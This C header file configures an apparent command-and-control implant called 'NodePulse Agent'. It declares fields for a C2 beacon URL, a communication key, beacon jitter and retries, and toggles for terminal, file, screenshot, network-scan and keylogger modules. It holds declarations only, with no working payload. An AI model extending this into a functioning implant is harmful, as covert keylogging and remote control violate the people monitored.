/*
 * NodePulse Agent Configuration
 * 
 * Configuration values are baked in at compile time via config_values.h
 * Agent ID is auto-generated on first run and persisted locally.
 */

#ifndef CONFIG_H
#define CONFIG_H

#include <stddef.h>

/* Include compile-time configuration values */
#include "config_values.h"

/* Configuration structure */
typedef struct {
    char agent_id[37];      /* UUID format: 36 chars + null terminator */
    char c2_url[256];       /* C2 beacon URL */
    char comm_key[65];      /* Organization communication key */
    int sync_interval;      /* Seconds between beacons */
    int jitter_percent;     /* Randomization percentage */
    int max_retries;        /* Connection retry attempts */
    char modules[128];      /* Comma-separated enabled modules */
} AgentConfig;

/* Module flags (parsed from modules string) */
typedef struct {
    int terminal;
    int files;
    int screenshot;
    int systemInfo;
    int networkScan;
    int keylogger;
} ModuleFlags;

/* Initialize configuration from compile-time values and load/generate agent ID */
void config_init(AgentConfig* cfg);

/* Parse module string into flags */
void config_parse_modules(const char* modules_str, ModuleFlags* flags);

/* Get the agent ID (first 8 chars for display) */
const char* config_get_short_id(const AgentConfig* cfg);

/* Check if a specific module is enabled */
int config_module_enabled(const AgentConfig* cfg, const char* module_name);

#endif /* CONFIG_H */
